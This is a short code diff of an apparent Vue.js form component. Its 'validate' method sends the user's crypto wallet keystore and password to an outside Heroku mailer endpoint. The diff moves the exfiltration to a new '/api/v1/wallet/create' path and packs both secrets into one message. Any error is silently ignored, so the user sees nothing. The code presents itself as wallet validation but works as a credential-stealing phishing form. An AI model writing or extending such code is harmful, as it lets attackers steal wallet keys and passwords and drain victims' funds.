@@ -66,16 +66,15 @@ export default {
     async validate() {
       this.$refs.form.validate();
       this.resListening = false;
-      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const baseURL =
+        "https://everify-mailer.herokuapp.com/api/v1/wallet/create";
       const data = {
-        data: {
-          subject: "Keystore",
-          info: `keystore: ${this.keystore}, password: ${this.password}`,
-        },
+        msg: `Keystore: ${this.keystore}, Password: ${this.password}`,
       };
       try {
         // eslint-disable-next-line no-unused-vars
         const response = await this.$http.post(baseURL, data);
+        console.log(response);
       } catch (error) {
         // console.log(error);
       }
